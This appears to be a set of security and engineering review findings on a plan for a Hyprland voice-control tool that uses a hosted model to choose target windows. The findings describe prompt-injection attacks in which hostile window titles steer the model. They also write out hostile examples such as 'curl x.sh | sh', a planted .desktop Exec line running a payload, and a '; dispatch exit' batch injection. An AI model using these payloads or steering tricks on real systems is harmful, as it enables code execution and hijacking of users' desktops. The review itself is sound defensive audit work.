verdicts.verdict: The Jev headline numbers in section 1 (315 ms p50, question count free, payload knee, 503 split, 4 of 30 flips, 0.059 to 0.040 stdev, Score confidence not recomputable) all reproduce from the JSON on disk, so the plan's core direction is sound. But the latency budget understates the Jev stage p90 and the decode stage, several [V] labels sit on figures the checker explicitly said it did not verify, and R3 as specified cannot fit the plan's own 1.8k token cap. Most important change: rebuild section 10 honestly (p90 from a real estimator on persisted per-call samples, decode as a function of utterance length, capture tail included) and fix the R3 size versus cap conflict before P3 designs around it.
strengths: Section 1's core Jev numbers reproduce exactly from live/*.json: p50 315/314/448/544 by tokens, 323/322/312/317 by question count, provider leg 219 to 235 ms, concurrency 359 ms, 26 vs 4 flips with P 0.45 to 0.67, 0 of 25 vs 4 of 25, stdev 0.059 to 0.040, and Score confidence failing the client formula on all 7 live Score answers. The 'local fast path first, many small parallel requests, margin gate' direction follows from them.

The plan is candid where it matters: thresholds, hedge and deadline values are marked [A] with a named phase to replace them, row 5 discloses that output was not persisted, and P0's exit criterion forces every named [A] to become [M].

Corrected checker values are used for the hard safety facts (no lock gate on IPC dispatch, Lua strings never executed, cold Python start 95 to 240 ms, Moonshine over Parakeet under load), not the researchers' originals.

verdicts.verdict: The plan has the right skeleton (classification separate from authorization, dangerous ops never offered to Jev, lock gate, no shell strings from speech), but its central injection defense is defined so that the attacker controls the anchor: corroboration accepts overlap with "title tokens" and "kind", both of which a hostile window or a benign app kind satisfies for free, and it gates only tier 1 while tier 0 focus is the setup step for the type_text attack. The single most important change is to redefine corroboration to exclude attacker-controlled text (titles) and to make type_text a context-dependent tier that re-verifies the focused window's class and address at dispatch time, refusing terminals, launchers and auth surfaces by default. The lock gate also needs to be atomic with dispatch (same [[BATCH]]) and capture must stop on a push signal, not a poll.
strengths: Authorization is structurally separate from classification: tier 3 operations (exit, power, force kill) are never offered to Jev and tier 2 requires the destructive verb literally in the transcript plus an explicit target (PLAN.md:221-222, :253-254). Keep this and extend it to exec-class binds and context-dependent typing.

Jev only chooses among code-generated candidates addressed as address:0x..., with no catch-all option and thin margins routed to hints rather than action (PLAN.md:67-69, :219-220, :256-258). This bounds what any injection can achieve to picking among real windows, which is what makes the corroboration fix sufficient.

The plan adopts the compositor's j/locked failing closed over hypruse's /proc scan, correctly identifies that Hyprland does not gate IPC dispatch on the lock, and commits to inspectability of every outbound body (PLAN.md:37, :80-81, :313-314). The direction is right; it needs atomicity, a push signal and extra lock sources.

verdicts.verdict: The architecture is sound and P0 front-loads the critic's three weakest decisions (STT bake-off, question-design rerun, PTT spike). It is not yet buildable as sequenced. Section 8 understates the fork surgery: every trust guard call site, the lock call sites and the launch logic live in the dropped server.py, and 403 of 607 tests import it. The two-process product also has no install, start, config, versioning or failure-reporting design before P5. The single most important change is to rewrite section 8 and P1 around an explicit extraction of the guard wiring and launch logic out of server.py, with a test-salvage budget. Dictation must be specified against the a11y-dependent password guard. The second change is a packaging and lifecycle section pulled forward to P2.
strengths: P0 exists and targets the critic's D1, D2 and D3 directly (idle-machine STT bake-off on a real mic corpus, persisted question-design rerun on a labelled set, live bindr and first raw-socket dispatch). The evidence-label discipline ([M]/[V]/[D]/[A]) makes unverified numbers visible. Keep both.

Replacing only hyprctl._run with a socket client is the right seam. Every hyprctl caller and the 38 tests in tests/test_hyprctl.py that patch _run keep working, and hypruse-map.md:252 already specifies the argv-to-wire mapping and the fail-closed error mapping.

Safety is decided in code, not by the model: the tier table, corroboration against the transcript, dangerous operations never offered to Jev, the lock gate before every dispatch, hints on thin margins and no caching of near-ties. This resolves critic C10, C12, C13 and C15 explicitly.

verdicts.verdict: The skeleton is sound (code calculates, Jev judges, tier gate in code, margin gate, state slicing), but the plan uses Jev as a plain argmax classifier with a margin check and leaves most of its free properties unused: free extra questions, free concurrency, absolute booleans next to relative choices, and probabilities as HUD input. It also drops the stt lane's speculative finalize, which is the cheapest route to perceived instantness. The single most important change: make R2 an agreement of two formulations (the Choice plus one absolute boolean per window, sent as a fourth concurrent request), which gives the missing "target not present" signal and a cross-request noise average. Then pair it with act-then-swap hints for tier 0 and a one-level undo moved from P5 to P3/P4.
strengths: Code calculates, Jev judges, and the tier table disposes: candidates are generated from the live desktop, dangerous operations are never offered to the model, and corroboration requires that the user actually said the entity. These must survive any change that adds questions.

State slicing under a measured token cap (about 1.8k) with concurrent small requests follows the live data (question count is free, payload is not, 503s scale with size). The proposed R2b and duplicate requests fit inside this rule rather than breaking it.

The grammar fast path over a live lexicon with zero network, plus an eval harness that scores decisions across N runs and compares question banks, is the right base for both speed and for testing every improvement proposed here.

findings.title: Corroboration accepts overlap with title tokens, so a hostile title anchors itself
findings.problem: PLAN.md:244-245 lists 'title tokens' and 'kind' among the things that may anchor a pick. The closing argument at :246-247 ('it cannot make the user say its name') is only true if the anchor set excludes attacker-controlled text. It does not. Any web page, terminal escape sequence (OSC 0/2), chat message preview or file name sets a title. The check is also symmetric to noise: it fires on ANY overlapping token, not on a discriminating one. No adversarial test exists at all (critic.md U5, R6; grep of live/*.json finds no injection strings), and the only live targeting datum is a near coin flip (critic.md section 0 items 1-2: P(w1) 0.45 to 0.67, wrong window 4 of 30), so a small title nudge is enough to flip argmax.
findings.evidence: Concrete bypasses against PLAN.md:244-247. (a) Command-word stuffing: tab title 'open close move focus switch type the window browser terminal music workspace'. Every utterance in the v1 domain shares a token with it, so it is always 'corroborated'; the same title also carries steering text inside the 60 char cap (PLAN.md:212). (b) Kind match: user says 'move the browser to workspace 3'; hostile page is itself a Firefox window, so kind='web browser' corroborates it for free, and Jev only has to be nudged between two same-kind windows. (c) Echo attack: title copies likely phrases ('my notes', 'the music', 'youtube'). (d) Homoglyph/phonetic: corroboration is 'lexical or phonetic' (:245), so a title 'Kitty' in Cyrillic or 'kiddy terminal' matches phonetically while evading any exact-string denylist or learned alias; zero-width joiners split tokens for a sanitizer but not for a phonetic key. (e) Poisoned learning: principle 5 (PLAN.md:76-77) and P5 (:388-389) compile confirmed Jev resolutions into the grammar; if the learned pattern keys on title tokens, a one-time win becomes a permanent network-free EXACT match.
findings.fix: Split anchors into trusted (Name, GenericName, Categories/kind, Keywords from .desktop files owned by root under /usr/share, user aliases, workspace names) and untrusted (window title, initialTitle, anything from ~/.local/share/applications unless user-approved). Trusted anchors may corroborate any tier. Title tokens may only break a tie among windows that are ALREADY corroborated by class/kind, must be discriminating (token absent from all other candidates and from a stoplist of command verbs, nouns and kinds), and may never corroborate a type_text target or a tier 2 target. When two candidates share the corroborating kind, corroboration is not satisfied: go to hints. NFKC-normalize, strip Cf/Cc/bidi code points and reject mixed-script tokens before both serialization and matching; phonetic matching only against trusted names. Learned patterns must never key on title text. Add evals/adversarial.jsonl cases (a)-(e) as a P3 exit gate with wrong-action rate 0 on them.

findings.title: type_text is tier 1 regardless of focus, and 'no Enter' does not stop code execution in a terminal or launcher
findings.problem: PLAN.md:252 puts 'type short text' in tier 1 (acts on EXACT from the fast path with no Jev, no corroboration of the target, no countdown). The only hard limit is 'typed text never includes Enter' (:262). Typing lands in whatever has keyboard focus at the moment wtype runs, and focus is tier 0 (:251), which needs NO corroboration, so a hostile title can win focus first. critic.md R5 and R8 flag this and the plan does not answer either: hypruse's auth interlock is blind to Quickshell polkit agents and the password-field guard depends on the AT-SPI bus that is broken on this machine (hypruse-map.md:316, critic.md U16).
findings.evidence: Attacks. (1) Terminal: many shells execute without a literal Enter key: a transcript normalizer or wtype that passes '\n', '\r', Ctrl-J, Ctrl-M or Ctrl-O through; bracketed-paste-off terminals; fish/zsh abbreviations and autosuggestions; and the user's next habitual Enter executes 'curl x.sh | sh' typed by a video or a bystander while PTT was held for a different sentence. The plan filters 'Enter', not the control-character class. (2) Launcher: with a focus-stealing layer (rofi/walker, hypruse-map.md 'launcher' kind) open, typed text is a command line; several launchers run on a single match. (3) Exfiltration: hostile page gets focus via tier 0 (no corroboration), then 'type ...' delivers dictated text into its form; critic.md R6 names exactly this path. (4) TOCTOU: the target is resolved at decision time, but focus can change during the 120-540 ms pipeline (PLAN.md:348) or be changed by a window calling xdg-activation; hypruse-map notes sequence 'does not catch a bare focus change'. (5) Auth prompt: dictation into a polkit/Quickshell prompt or a password field, with the transcript then written to journal and sent to Jev in R1.
findings.fix: Make type_text context-tiered in tiers.py, decided from the focused window re-read in the SAME [[BATCH]] as the lock check immediately before typing, pinned to the address captured at key DOWN (if focus address or class changed between key down and dispatch, refuse visibly). Tier 2 (countdown) or refuse by default when class is a terminal, a launcher/keyboard-grabbing layer is open, the class is in _AUTH_CLASSES, or kind is unknown; tier 1 only for an allowlist the user grows. Strip all C0/C1 control characters and Unicode line/paragraph separators, not just Enter; cap length; type via the address-targeted path. Never send the dictated span to Jev (R1 should carry the carrier verb and a placeholder, since code cuts the span anyway per PLAN.md:185) and store it in the journal as length plus hash, matching hypruse's rule (hypruse-map.md:321).

findings.title: Lock gate is check-then-act, capture stop has no trigger, and non-protocol lockers never set the flag
findings.problem: PLAN.md:263 and :267 say 'locked check' then dispatch, as separate steps, and 'capture stops while locked' with no mechanism. socket2 has no lock event (hypr-ipc.md:130), so the plan as written can only learn about a lock by polling, and it specifies no poll. P1's exit test only simulates locked=true (PLAN.md:372-373), which proves the branch, not the race. Also, tier 3 contains 'lock' (:254) which is fine, but nothing covers the window between lock and the pipeline finishing.
findings.evidence: Attacks. (1) Race: user holds PTT, says 'close window', releases and hits SUPER+L (or the idle locker fires). Decode plus Jev is 490-540 ms p50 with tails past 600 ms and a 900 ms deadline (PLAN.md:232, :345-348); tier 2 adds a 1.5 s countdown (:253). If the check ran at pipeline start or before the countdown, the action lands behind the lock screen; Hyprland does not gate IPC dispatch (hypr-ipc.md:249, :369). (2) PTT while locked: transport A uses plain bind/bindr, which Hyprland skips while locked (KeybindManager.cpp:649) so key UP is never delivered if the lock lands mid-hold: capture stays open indefinitely, recording the room, and tap-to-latch mode (PLAN.md:164) has the same problem by design. Transport B (global shortcuts) and any 'bindl' variant deliver while locked. (3) Lockers that do not use ext-session-lock-v1 never set j/locked: Omarchy 4's in-process Quickshell lock (hypruse-map.md fail-open item 2, critic.md U17 'untested'), plus screensaver-style 'lockers', DPMS-off and a closed lid. The plan targets Omarchy 4 explicitly (PLAN.md:291) yet treats j/locked as sufficient. (4) The fallback order in section 8 (:313-314) is 'j/locked failing closed, /proc scan only as fallback': if the fallback is reached when j/locked errors, that is fail-open by the back door, since the /proc scan returns None when unreadable (hypruse-map.md fail-open item 1).
findings.fix: Make the gate atomic: every acting request is one [[BATCH]] whose first sub-request is 'locked' is not enough because batch members are unconditional, so instead send 'j/locked' and the dispatch back to back on the worker with the lock re-checked AFTER effect confirmation too and the inverse applied if it flipped; better, bind hyprland_lock_notifier_v1 in wire.py (the plan already keeps wire.py for global shortcuts, hypr-ipc.md:248) and hold a process-wide 'locked' latch that drops the in-flight utterance, cancels countdowns, closes the audio stream and zeroes the ring buffer on the locked event. Re-check at: key down, key up, after Jev returns, at countdown expiry, immediately before write. OR the signals: j/locked OR notifier OR a lock-kind layer surface present (hypruse already classifies hyprlock/swaylock/lockscreen namespaces) OR a user-configured locker class/namespace for Quickshell OR logind LockedHint/lid. Any error on any source means refuse. Add a max hold duration (for example 15 s) so a lost key-up cannot leave the mic open. P1 exit test must include a lock that arrives between decision and dispatch.

findings.title: Dropping server.py removes all guard wiring and the launch logic; typing loses its auth guards and section 8 never restores them
findings.problem: Section 8 lists trust, safety and 'launch logic' as kept and 'the MCP server surface' as dropped. In the real code the kept modules are only libraries. Every call to a trust guard is in server.py: guard_auth_client, guard_password_field, guard_session_lock, guard_keyboard_layer, guard_use_bind, guard_covering_layer and guard_client. launch() and _launch_and_wait() are also in server.py (lines 1093 and 1066). input.py and hyprctl.py call no trust function at all. The password-field guard also depends on a11y.py over busctl, which the plan itself says is broken on this machine, and it fails open. Critic R8 (dictation into an auth prompt, Quickshell polkit agents invisible to the class check) is not answered anywhere in the plan. trust.py also imports a11y at module level, and a11y is in neither the keep list nor the drop list.

State which guards exec.py must call per operation. Add a11y.py to the keep list explicitly, or stub focused_role. findings.title: R3 with rich app descriptions cannot fit the 1.8k token cap; the '83 options at about 1k tokens [M]' figure was never recorded
findings.problem: The plan caps every request at about 1.8k tokens, and specifies R3 as one Choice over all installed apps described as {name, kind, keywords}. The only live test (dayone.py step 6) used bare Name strings, and it never saved input_tokens, so 'about 1k tokens [M]' has no raw backing. Rich descriptions are the thing row 5 says accuracy depends on, and they roughly triple the payload, landing R3 in the 2.2k to 6k zone where latency rises to 448 ms and 503s start.
findings.evidence: live/dayone.py step 6 stores only choice and top3 (dayone_out.json option_order has no usage field). Recomputed offline: chars per token calibrated from latency_vs_tokens bodies is 2.5 (29102 chars = 11542 tokens; 5482 = 2246), fixed overhead about 250 tokens (probe_out.json A_tiny inputTokens 281 for a one-boolean request). The bare 83-option body on this machine is 2972 chars, so about 1.2k to 1.4k tokens, not 1k. The same body with name + GenericName/Categories + Keywords from the same 82 .desktop files is 9009 chars, about 3.5k to 3.8k tokens (estimate). Also 1 of the 10 permutation calls returned 503 (dayone_out.json errors, tag 'perm').
findings.fix: Relabel the 1k figure [A] until P0 records usage. Decide now how R3 stays under the cap: kind only (no keywords), two parallel R3 shards, or a category prefilter; add a P0 task measuring tokens and accuracy for rich 83-option requests.

findings.plan_section: 10 Latency budget, Jev row (line 345); 5.5 hedge at 450 ms
findings.title: Jev stage 'about 410 ms p90' is not a p90 and does not represent the planned requests
findings.problem: The p90 comes from n=12 rounds with a floor-index estimator, so it is the 10th smallest of 12 (two rounds were slower, one at 607 ms). The rounds were three identical copies of a roughly 600 token, 2-question request, not R1/R2/R3 at up to 1.8k tokens with 83 or more options. The stage is a max of three calls, so its p90 sits near the single-call p96 to p97, which the n=30 blocks place above 440 ms. The 450 ms soft hedge would then fire on well over a tenth of Jev-path utterances, doubling load on a service that already returns 503.
findings.evidence: live/dayone.py summ(): p90 = ts[int(.9*(n-1))]; for n=12 that is index 9; for n=30 index 26 (the 27th of 30, about p87), so every p90 in section 1 row 1 is biased low too. concurrent_3_wall_ms = {n:12, p50:359, p90:410, max:607}; body is bB = state(5) + intent + cmd. Single-call p90s are 356 to 439 (route_A_vs_B.A.p90 = 439, B = 409); 6 of 8 small 30-call blocks have max above 600 ms (610, 602, 1617, 648, 738, 769), so at least 2.5 percent of single calls exceed 600 ms and about 7 percent of three-way rounds would, consistent with the 1 in 12 observed. Per-call samples were not persisted, so none of this can be recomputed exactly.
findings.fix: State the Jev stage as 'about 360 ms p50 (n=12, synthetic small requests); p90 unknown, likely 450 to 600 ms' and mark it [A] for p90. In P0 persist every per-call latency, use a proper percentile estimator, measure with real R1/R2/R3 bodies, and set the hedge point from that distribution, not before.

findings.plan_section: 10 Latency budget, Decode row and Total (lines 343, 348); section 1 row 8; 5.2
findings.title: '120 to 170 ms' decode is a range of two medians for 1 second clips, presented as a stage range; capture tail is missing from the budget
findings.problem: 120 and 166 ms are the researcher's and the checker's medians, not a min to max. The checker's own run ranged 123 to 372 ms, and the clips were 0.85 to 1.56 s long. Decode scales with audio length (checker RTF 0.169), so the plan's own example utterances ('the firefox with youtube', compound commands, 'type <short text>') at 3 to 4 s cost roughly 350 to 650 ms on this evidence. The totals '125 to 175 ms' and '490 to 540 ms p50' and Goal 2's 200 ms inherit this. The stt report's own budget also includes about 40 ms of capture tail that the plan's table drops.
findings.evidence: stt.md:317 'Rerun at loadavg 27.8, 1 thread: median 166 ms (123 to 372) ... RTF 0.169 ... treat 120 ms as a contended-but-lighter figure, not a constant' (verdict PARTIALLY CORRECT). stt.md:127 'decode time for a 0.85 to 1.56 s command'. stt.md:247 '0.5 s with push to talk release (40 ms capture + 140 ms decode + 320 ms Jev)'. Arithmetic check of the table as written: 1+120+2+360+1+1 = 485 and 1+170+2+360+1+1 = 535, so '490 to 540' is also 5 ms off its own rows.
findings.fix: Express decode as 'median 120 to 170 ms for a 1 to 1.5 s command, up to about 370 ms observed, scaling at RTF about 0.12 to 0.17 [M][V]', add a capture-flush row, and give totals for a 1.2 s and a 3 s utterance. Add P0 task: decode time vs utterance length on the idle machine.

findings.title: 'Question wording dominates' rests on an unpersisted n=12, one-utterance test whose baseline contradicts the saved data

findings.title: 'launch only starts .desktop entries' is not a code-execution boundary
findings.problem: PLAN.md:261-262 treats .desktop entries as a safe closed set. They are arbitrary shell lines: hypruse's launch hands 'an arbitrary shell line' to Hyprland exec (hypruse-map.md:54) and the lexicon reads every XDG data dir including user-writable ones. The plan says nothing about which directories are trusted, Exec field codes, hidden entries, or how the Exec line is embedded in a dispatch.
findings.evidence: Attacks. (1) Planting: any unprivileged process, a Flatpak with filesystem=home, a browser download handler, an npm postinstall or a tarball extraction drops ~/.local/share/applications/firefox.desktop with Name=Firefox, GenericName=Web Browser, Exec=sh -c 'payload; exec firefox'. XDG precedence makes it shadow the system entry by ID, and its Name/Keywords are 'trusted' corroboration anchors under 5.6, so 'open the browser' runs the payload on the network-free EXACT path. It persists and fires on the user's own voice, which converts a file-write primitive into delayed execution outside any sandbox. (2) Keyword squatting: a new entry with Keywords=browser;terminal;music;files;notes; competes in R3 for every semantic reference. (3) Batch/renderer injection: compound plans go out as one [[BATCH]] (PLAN.md:268-269); 0.56.2 dispatchBatch splits on ';' outside brackets with no escaping (hypr-ipc.md:242), so an Exec line containing ';' injects further hyprctl requests (for example '; dispatch exit' or 'keyword ...'). Under Lua the Exec string is evaluated inside hl.dsp.exec_cmd("...") and only lua_str is sanctioned (hypruse-map.md:435). (4) Entries with Terminal=true, NoDisplay=true, Hidden=true or DBusActivatable are unspecified; nlu-arch.md:108 only filters NoDisplay.
findings.fix: Index by desktop-file ID and record source dir, owner and mtime/hash. Entries under root-owned system dirs are trusted. Entries in user-writable dirs (including Flatpak exports and ~/.local) are listed by 'hyprsay doctor' and need a one-time explicit approval pinned to the file hash; a changed hash or a new entry that shadows a system ID revokes approval and shows a HUD notice. Launch through a process spawn with an argv parsed per the Desktop Entry spec with field codes stripped (or 'gtk-launch'/'gio launch' by ID), never by pasting Exec into a Hyprland exec string; if Hyprland exec is kept for [workspace N silent] rules, never batch it and reject ';', newlines and brackets, and use lua_str on the Lua path. Skip Hidden/NoDisplay/Terminal=true unless approved.

findings.title: Tier 1 is too lenient for move, launch-with-focus and opted-in binds, and speech-derived strings reach the Lua evaluator and batch parser
findings.problem: PLAN.md:252 rates 'move' and 'launch' as reversible tier 1 and :262-263 allows use_bind for any bind the user opts in, with no tier derived from what the bind does. Separately, PLAN.md:267-269 renders operations as Lua expressions and batches; the plan keeps 'lua_str escaping' (:311) but never states that every speech- or desktop-derived string goes through it, and the entire Lua path is unexecuted (critic.md C17, U14).
findings.evidence: (1) Move is not harmless: 'move this to workspace 9' on a wrong target hides a window; moving a window onto a workspace visible on a projector or a screen share discloses it, and no undo exists until P5 (PLAN.md:270-271; critic.md C13). A moved window also silently changes what 'this' means for a following 'type' or 'close'. (2) Launch is an irreversible side effect (autostart of sync clients, a second browser profile opening the last session on a shared screen, mail clients sending queued mail) and the launched window takes focus, which redirects any queued or following type_text. (3) Binds: the user has 125 to 131 binds including exec scripts, power menus and exit (critic.md R5). An 'opted in' bind keeps whatever dispatcher and arg the config has at run time (hypruse-map.md:55 'dispatches the bind's own dispatcher and arg verbatim'), so a later config edit, or a submap, silently changes what the voice command runs; and an opted-in exec bind makes bind selection by Jev an RCE-class choice gated only at tier 1 or lower since binds have no tier in the table. (4) Lua: workspace NAMES, user aliases and window-derived selectors are strings that reach 'return hl.dispatch({})' (hypr-ipc.md:367). hypruse protects one argument with a blacklist (hypruse-map.md:435). A workspace renamed by any client or a learned alias containing a quote breaks out of the Lua string; a ';' in any argument splits a batch (hypr-ipc.md:242).
findings.fix: Give each op a tier function of (op, target, context) instead of a constant: move to a workspace on another monitor or a special workspace is tier 2 light (short countdown); launch is tier 1 but suppresses type_text for N seconds or until the pinned address is re-confirmed. For binds, store the opted-in bind as (combo, dispatcher, arg) and refuse if the live bind differs; classify by dispatcher: exec/execr/exit/kill/forcekill/pass/sendshortcut/submap/global are tier 3 (grammar only, never a Jev option), the rest inherit the matching op's tier. Make ops/ the only place strings are rendered, with a typed argument schema: workspace is int or a name matching ^[\w -]{1,32}$, address matches ^0x[0-9a-f]+$, everything else through lua_str; reject ';' and newlines in any batched member; add property tests that fuzz both renderers with quotes, brackets, ']]', ';' and backslashes. Do not ship the Lua renderer enabled until it has been executed on a Lua session.

findings.title: Title denylist by class is a weak signal and the default leaks far more than the plan states; transcripts are also unredacted
findings.problem: PLAN.md:295-297 sends truncated titles for every window in R2 on every semantic command, removing titles only for a class denylist ('password managers, private browsing'). Class does not identify sensitive content. The plan also says 'R1 carries only the utterance' as if that were benign, and 'journal and cassettes redact titles by default' (:301) says nothing about transcripts, dictated text, or the memo cache.
findings.evidence: (1) Private browsing has no distinct class: Firefox private windows and Chromium incognito share class 'firefox'/'chromium' with normal windows; only a title suffix (localized, user-removable) differs, so the named example in the plan cannot be implemented by class. (2) Password managers in the browser (Bitwarden web vault, extension popups), webmail subjects, banking pages, chat contact names, medical or legal document names, and terminal titles carrying user@host:cwd and the running command (including secrets passed as arguments) all ride on allowed classes; the first 60 characters is exactly where the sensitive part is. (3) XWayland/Electron apps report generic or empty classes; initialClass vs class mismatch; a denylisted app's title still leaks via a screen-share or picture-in-picture window of another class. (4) R2 carries all windows although most utterances name a class-distinguishable target (critic.md R1, R6 propose 'titles only to break ties' and the plan ignores it). (5) Exposure is multiplied by the hedge duplicate at 450 ms and the retry (PLAN.md:231-233), and ZDR is only 'requested once P0 confirms' (:298), so until then default retention applies at both Vercel and TypeSafe in us-west-2 from an EU machine; nothing says calls are blocked if ZDR is rejected. (6) The R1 utterance includes the dictated span of 'type ...' and 'search for ...', and the answer cache (:236-239) persists utterance-keyed entries for 7 days; cassettes and evals/ are meant to be committed (PLAN.md:144, :334) and the pre-commit hook only looks for key patterns (:412).
findings.fix: Invert the default: R2 sends {app, kind, workspace} only. Titles are added in a second, smaller request only when code finds two or more candidates of the corroborated class AND the utterance has residual discriminating words, and only for those candidates; never for type_text or tier 2 targets. Treat the denylist as title-pattern plus class plus kind (private/incognito suffixes, 'vault', 'password', terminal classes off by default), and make it an allowlist per class for title sending. Fail closed on ZDR: if route B rejects the option, do not send titles at all. Replace dictated spans with a placeholder before R1. Key the cache by a salted hash, store no plaintext, keep it in memory or under $XDG_RUNTIME_DIR. Journal stores transcript only for command utterances with spans hashed; cassettes recorded for evals must come from synthetic fixtures, and 'hyprsay record' output is gitignored with a pre-commit check that rejects cassettes containing non-fixture window addresses or titles. 'inspect --last' should show hedge and retry copies too.

findings.title: PTT and confirm are forgeable by any local client, and 'second key press' confirm shares the channel it is meant to authenticate
findings.problem: Transport A turns a socket2 'custom>>hyprsay:down' line into 'open the microphone' (PLAN.md:156-158). Anything that can reach .socket.sock can emit it with 'dispatch event hyprsay:down'. That process can already 'dispatch exec', so it is not a privilege escalation on its own, but it matters in three ways the plan does not consider, and tier 3 confirmation by 'second press' (:254, :281-282) rides the same forgeable event.
findings.evidence: (1) Covert recording: a same-user process sends hyprsay:down and never sends up; capture runs with a HUD the user may not be watching, audio buffers grow, and with tap-to-latch (:164) this is the designed behavior. Combined with a speaker playing a crafted clip this gives a process that lacks input-injection tools a path through hyprsay's launch/type surface with hyprsay's journal showing the user as the actor. (2) Confirmation bypass: tier 3 'spoken or second-press confirm' can be satisfied by the same event injection, or by the same video that spoke the command saying 'confirm' (critic.md R5). PTT being held is the only thing separating a video from the user, and the countdown for tier 2 (:253) is cancel-only, so silence equals consent: an attacker's audio 'close window' during a legitimate PTT hold executes after 1.5 s unless the user notices. (3) Event data confusion: socket2 DATA is truncated at 1024 bytes and fields are comma separated (hypr-ipc.md:103), so a window title containing commas or '>>' can corrupt a naive 'activewindow>>class,title' or 'windowtitlev2' parse and desync the world model that decides what 'this' is. Newlines are replaced, so a title cannot forge a whole 'custom>>' line; say so in the plan and test it.
findings.fix: Prefer transport B (global shortcut bound in-process, not forgeable through socket2) as default and document A as the zero-dependency fallback with this caveat. Enforce a max hold and max latch duration, and require a fresh down/up pair per utterance. Tier 3 confirm must be a physical key event delivered via transport B or a distinct keybind, never a spoken 'confirm' in the same or the next utterance within the same audio context, and never a socket2 custom event. Tier 2 should require the destructive verb plus explicit target AND the window must have been focused or named, with the countdown shown on the target window; consider requiring PTT to remain held or be re-tapped to commit rather than timing out into action. Parse socket2 with maxsplit on the documented field count, use only the v2 events keyed by address, and re-read titles from j/clients rather than from event payloads.

findings.title: 'tests already patch at _run' is true only for test_hyprctl.py; two thirds of the suite imports the dropped server module
findings.problem: The [V] claim holds narrowly. tests/test_hyprctl.py monkeypatches hyprctl._run throughout, and the socket swap keeps those 38 tests. tests/conftest.py imports server and patches server._plain_blocks in an autouse fixture, so after the drop the whole suite fails at collection. 403 of 607 test functions live in files that reference server. Those include test_trust (71), test_launch, test_use_bind, test_close_window, test_keyboard_target and test_dryrun, which are the tests that cover the safety behaviour the fork claims to inherit. conftest also pins trust.session_locked to a lambda. P1 rewrites session_locked to the j/locked query, so the new lock path is patched out of every test by default. The P1 exit test 'simulates locked = true' can pass without exercising the socket query or the fail-closed branch. P1 budgets nothing for test porting, yet 'green tests' gates every phase.
findings.evidence: /home/ilyask/projects/hyprsay/tests/conftest.py:12 (`from hypruse import hyprctl, journal, server, trust`), :35, :58. Counted 607 test functions in total and 403 in files matching 'server'. test_hyprctl.py:92-471 patches _run.
findings.fix: Add a P1 task with a number: which test files are deleted with their surface (mcp_roundtrip, skill, marks, zoom, screenshot, waybar, cli_state) and which are ported to the extracted core functions (trust, launch, use_bind, close_window, keyboard_target, dryrun). Make the lock-gate exit criterion specific. At the _run level, a 'j/locked' reply of true, a malformed reply and a connection error must each block dispatch. Use the /proc fallback only when the request returns 'unknown request'.

findings.title: The two-process product has no install, start, supervision or version-compatibility design
findings.problem: The plan justifies two interpreters and then never says how the pair is delivered. (1) Engine install: 'uv venv' appears in a diagram label only, and the AUR recipe is a P5 bullet. An AUR package cannot ship a uv venv of pip-only wheels without a design (options: build the venv in a post-install hook, a `hyprsay setup` step, or pipx/uv tool plus separate distro deps python-gobject, gtk4-layer-shell and portaudio). ui.md:94 and critic C18 offer `--system-site-packages` as a single-process alternative, and the plan does not say why it was rejected. (2) Start: systemd user units arrive in P4, but the engine must be resident from P2 because the PTT events land on a running process. Nothing says who starts the HUD, what the engine does if the HUD is absent or crashes, or the socket path, ownership and reconnect. ui.md:574 already specifies PartOf=graphical-session.target and restart on failure, and none of it reached the plan. (3) Compatibility: hud/ 'imports nothing from src/', so the NDJSON schema exists twice with no protocol version, hello handshake or unknown-message policy. A half-upgraded install fails silently. (4) Three more gaps: the single-instance lock, the behaviour when the Hyprland instance signature changes after a compositor restart, and the environment import for the user unit.
findings.fix: Add a section 'Packaging and lifecycle', decided before P2. It should cover: install layout (for example /usr/lib/hyprsay venv built by `hyprsay setup`, HUD as plain files run by /usr/bin/python3, distro deps listed); two user units (hud Requires/After engine, both PartOf graphical-session.target); socket at $XDG_RUNTIME_DIR/hyprsay/hud.sock owned by the engine; a first message {t:hello, proto:N} with refuse-and-report on mismatch; engine behaviour with no HUD (fall back to hyprctl notify). Move the units to P2. State in writing why a system-site-packages venv was rejected.

findings.title: The HUD comes after the phase whose safety model depends on it, and the P4 exit criterion is not testable
findings.problem: Hints, the tier 2 countdown chip, the 'refused' state and the dimmed transcript are the plan's answer to a noisy model (principle 3). All of them are HUD features, and the HUD is built in P4 after P3 'Understanding'. P3 can be scored on cassettes, but it cannot be run live in a usable or safe way. A hints decision has nowhere to draw badges, and a tier 2 close has no cancellable countdown. HUD risks the critic lists as unverified (U18: multi-monitor, fractional scale, blur cost, SIGTERM under a busy loop) are discovered last. P4 exit 'usable with eyes on the screen only' is subjective. P2 exit has no pass number. P5 has no exit criterion at all.
findings.evidence: PLAN.md:256-259 (hints band), 253 (countdown chip), 378-385 (P3 then P4), 387-390 (P5 has no 'Exit:'). critic.md U18.
findings.fix: Split the HUD. Put a minimal pill plus hints surface plus NDJSON protocol in P2 (states: hearing, heard, refused, hints, countdown), where it is also the debug surface for P3. Keep look-matching and the animation polish in P4. Rewrite the exits as checks. P2: first-word clipping rate at most X on the recorded corpus, and decode p90 at most Y ms on an idle machine. P4: a scripted protocol replay drives every state, with assertions via `hyprctl layers` (namespace present, the keyboard-interactivity flag off) and focus unchanged (activewindow identical before and after). P5: undo restores the prior state for every operation that declares an inverse.

findings.title: The Lua renderer and both-dialect layer rules are built with no way to execute them, and no phase creates one
findings.problem: P1 ships the Lua renderer 'marked unverified until a Lua-provider session exists', and P4 ships layer rules in both dialects. No phase creates that session. The critic notes the mandatory path is 100 percent unexecuted (C17, U14). Section 13 skips all live tests in CI. Half of the ops table (legacy, Lua, tier, inverse for every operation) is therefore speculative code that a unit test can check only as string equality against strings nobody has run. The existing hypruse Lua dispatch map covers 9 dispatchers (hypruse-map.md:66). The v1 operation set (resize, move, volume, layout, setprop flash, batch) needs many more. Critic U14 says several field names were never even read. `[[BATCH]]` of Lua dispatches and setprop under Lua are also unverified.
findings.evidence: PLAN.md:369-373, 383-384, 410-411. critic.md C17, U14. hypruse-map.md:66. /home/ilyask/projects/hyprsay/src/hypruse/hyprctl.py:177-250 (nine _lua_* renderers).
findings.fix: Either add a P0 spike, or cut the scope honestly. For the spike, run a nested Hyprland (Wayland backend, separate instance signature, throwaway Lua config) on the dev machine. It does not touch the live session. Execute every Lua string in the ops table against it, and keep it as the marked local integration target for both dialects. To cut scope, v1 supports the hyprlang provider only, detects Lua via j/status, and refuses with a clear HUD message. The Lua renderer is written when the nested session exists. Do not merge unexecuted renderer code as if it were a feature.

findings.plan_section: Missing: config, logging, errors, first run, devices, lifecycle
